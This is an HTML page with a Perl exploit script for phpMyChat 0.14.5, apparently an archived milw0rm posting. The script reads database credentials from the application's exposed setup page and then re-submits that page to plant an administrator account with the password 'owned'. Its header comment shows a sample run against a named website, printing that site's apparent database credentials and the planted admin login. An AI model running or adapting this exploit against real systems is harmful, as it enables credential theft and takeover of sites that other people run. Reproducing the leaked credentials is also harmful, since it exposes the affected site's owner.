<html><head><title>phpMyChat 0.14.5 Remote Improper File Permissions Exploit</title></head><pre>####################################################################
#
#  _____ _
# |  ___| | _____      ___
# | |_  | |/ _ \ \ /\ / /
# |  _| | | (_) \ V  V /
# |_|   |_|\___/ \_/\_/
#      Security Group.
#
#                    * phpMyChat remote sploit *                           
#                           by sysbug
#
# C:\Perl\bin&gt;perl pmc.pl www.kublooddrive.com /chat
# /* Mysql dump :
# * C_DB_HOST : localhost
# * C_DB_NAME : jhawk_pchat1
# * C_DB_USER : jhawk_pchat1
# * C_DB_PASS : vvejTjeLgB
# *
# * Adding Admin ....
# * login:jhawk
# * pwd:owned
# */
# C:\Perl\bin&gt;
# 
# Credits: all my friends!

use IO::Socket;

if(@ARGV &lt; 2){
usage();
}
main();
sub sock(){
$ock=IO::Socket::INET-&gt;new(PeerAddr=&gt;$host,PeerPort=&gt;80,Proto=&gt;'tcp',Timeout=&gt;10)|| die &quot; * s0ck null -\n&quot;;
print $ock &quot;$path\r\n&quot;;
print $ock &quot;Accept: */*\r\n&quot;;
print $ock &quot;Accept-Language: pt\r\n&quot;;
print $ock &quot;Accept-Encoding: gzip, deflate\r\n&quot;;
print $ock &quot;User-Agent: l33t br0ws3r\r\n&quot;;
print $ock &quot;Host: $host\r\n&quot;;
print $ock &quot;Connection: Keep-Alive\r\n\r\n\r\n&quot;;
$path = '';
}
sub main(){
print &quot;/*\n&quot;;
print &quot; * sploit remote phpMychat\n&quot;;
print &quot; *        by sysbug\n&quot;;
print &quot; *\n&quot;;
$host = $ARGV[0];
$folder = $ARGV[1];
$path = &quot;GET $folder/chat/setup.php3?next=1 HTTP/1.1&quot;;
sock();
$result =1;
while($recv = &lt;$ock&gt;){
if($recv =~ /(C_DB_PASS|C_DB_USER|C_DB_NAME|C_DB_HOST)(.*)(VALUE=)(&quot;)(.*)(&quot;&gt;)/){
$c++;
print &quot; * Mysql dump :\n&quot; if($result);
print &quot; * $1 : $5\n&quot;;
$mysql[$c] = $5;
$result = '';
}
else{
print &quot; * sploit failed! \n&quot;;
print &quot; *\\ \n&quot;;
exit;
}
}
close($ock);
$path = &quot;GET $folder/chat/setup.php3?next=2&amp;Form_Send=2&amp;C_DB_TYPE=mysql&amp;C_DB_HOST=$mysql[1]&amp;C_DB_NAME=$mysql[2]&amp;C_DB_USER=$mysql[3]&amp;C_DB_PASS=$mysql[4]&amp;C_MSG_TBL=messages&amp;C_REG_TBL=reg_users&amp;C_USR_TBL=users&amp;C_BAN_TBL=ban_users&amp;C_MSG_DEL=96&amp;C_USR_DEL=4&amp;C_REG_DEL=0&amp;C_PUB_CHAT_ROOMS=Blood+Talk&amp;C_PRIV_CHAT_ROOMS=&amp;C_MULTI_LANG=1&amp;C_LANGUAGE=english&amp;C_REQUIRE_REGISTER=1&amp;C_SHOW_ADMIN=1&amp;C_SHOW_DEL_PROF=1&amp;C_VERSION=1&amp;C_BANISH=1&amp;C_NO_SWEAR=1&amp;C_SAVE=*&amp;C_USE_SMILIES=1&amp;C_HTML_TAGS_KEEP=simple&amp;C_HTML_TAGS_SHOW=1&amp;C_TMZ_OFFSET=0&amp;C_MSG_ORDER=0&amp;C_MSG_NB=20&amp;C_MSG_REFRESH=10&amp;C_SHOW_TIMESTAMP=1&amp;C_NOTIFY=1&amp;C_WELCOME=1 HTTP/1.1&quot;;
sock();
while($recv = &lt;$ock&gt;){
if($recv =~ /(ADM_LOG)(.*)(VALUE=)(&quot;)(.*)(&quot;&gt;)/){
$c++;
$mysql[$c] = $5;
}
}
close($ock);
$pwd=&quot;owned&quot;;
$path = &quot;GET $folder/chat/setup.php3?next=2&amp;C_DB_TYPE=mysql&amp;C_DB_HOST=$mysql[1]&amp;C_DB_NAME=$mysql[2]&amp;C_DB_USER=$mysql[3]&amp;C_DB_PASS=$mysql[4]&amp;C_MSG_TBL=messages&amp;C_REG_TBL=reg_users&amp;C_USR_TBL=users&amp;C_BAN_TBL=ban_users&amp;C_MSG_DEL=96&amp;C_USR_DEL=4&amp;C_REG_DEL=0&amp;C_PUB_CHAT_ROOMS=Blood+Talk&amp;C_PRIV_CHAT_ROOMS=&amp;C_MULTI_LANG=1&amp;C_LANGUAGE=english&amp;C_REQUIRE_REGISTER=1&amp;C_SHOW_ADMIN=1&amp;C_SHOW_DEL_PROF=1&amp;C_VERSION=1&amp;C_BANISH=1&amp;C_NO_SWEAR=1&amp;C_SAVE=*&amp;C_USE_SMILIES=1&amp;C_HTML_TAGS_KEEP=simple&amp;C_HTML_TAGS_SHOW=1&amp;C_TMZ_OFFSET=0&amp;C_MSG_ORDER=0&amp;C_MSG_NB=20&amp;C_MSG_REFRESH=10&amp;C_SHOW_TIMESTAMP=1&amp;C_NOTIFY=1&amp;C_WELCOME=1&amp;ADM_LOG=$mysql[5]&amp;ADM_PASS=$pwd&amp;Form_Send=3&amp;Exist_Adm=1 HTTP/1.1&quot;;
sock();
if($mysql[5]){
print &quot; *\n * Adding Admin ....\n * login:$mysql[5]\n * pwd:$pwd \n *\\ \n&quot;;
}
else{
print &quot; * sploit failed! \n&quot;;
print &quot; *\\ \n&quot;;
}
close($ock);
}
sub usage(){
print &quot;/*\n&quot;;
print &quot; * sploit remote phpMychat\n&quot;;
print &quot; *        by sysbug\n&quot;;
print &quot; * usage: perl $0 xpl.pl &lt;host&gt;\n&quot;;
print &quot; * example: perl $0 xpl.pl www.site.com\n&quot;;
print &quot; *          perl $0 xpl.pl www.site.com /chat\n&quot;;
print &quot; */\n&quot;;
exit;
}

# milw0rm.com [2004-12-22]</pre></html>